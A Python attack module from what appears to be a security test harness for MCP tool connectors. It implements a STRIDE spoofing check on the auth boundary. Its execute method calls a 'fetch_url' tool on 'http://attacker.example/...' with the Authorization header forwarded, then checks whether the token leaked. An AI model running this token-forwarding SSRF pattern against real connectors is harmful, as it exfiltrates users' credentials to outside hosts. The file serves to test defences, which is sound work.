"""Phase 7 concrete attack for auth boundary, STRIDE letter S (Spoofing).

Pattern: :func:`attacks._patterns.auth_attack` (specialised by STRIDE).

CVSS:3.1 vector: ``CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H``

Cross-references:
- ``docs/04_Attack_Taxonomy.md`` — per-boundary STRIDE table.
- ``docs/notes/mcp_learning/00_appendix.md`` — Phase-1 ticket catalogue.
"""

from __future__ import annotations

from attacks._helpers import AttackContext, dispatch_call, dispatch_read, marker_match
from attacks.base import Attack, AttackResult
from framework.core.types import Boundary


class AuthSAttack(Attack):
    """STRIDE row for the auth boundary, letter S (Spoofing).

    CVSS:3.1: ``CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H``
    """

    id = "A-AUT-S"
    boundary = Boundary.AUTH
    cvss = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"

    async def setup(self, ctx: AttackContext) -> None:  # pragma: no cover - trivial
        # Concrete setup is a no-op for Phase 7; Phase 8 may add
        # connector-specific priming (e.g. open a session, populate a
        # scratchpad).
        return None

    async def execute(self, ctx: AttackContext) -> AttackResult:
        """Run the auth/S attack and return the result."""
        payload_marker = ctx.payload_marker

        # Auth token replay / SSRF / capability spoofing. The source
        # connector invokes a tool that performs an SSRF-style fetch
        # carrying the original Authorization header; the sink
        # connector reads a resource to detect whether the token
        # surfaced.
        sargs = {"url": f"http://attacker.example/{payload_marker[:8]}",
                 "forward_auth": True}
        sresp, slat = dispatch_call(ctx.source_connector, "fetch_url", sargs)
        rresp, rlat = dispatch_read(ctx.sink_connector, f"file:///{payload_marker[:8]}/auth.txt")
        success = marker_match(payload_marker, sresp) or marker_match(payload_marker, rresp)
        detail = {"ssrf_response": sresp, "resource_response": rresp,
                  "ssrf_latency_ms": slat, "resource_latency_ms": rlat}

        return AttackResult(success=bool(success), boundary=self.boundary, detail=detail)

    async def teardown(self, ctx: AttackContext) -> None:  # pragma: no cover - trivial
        return None
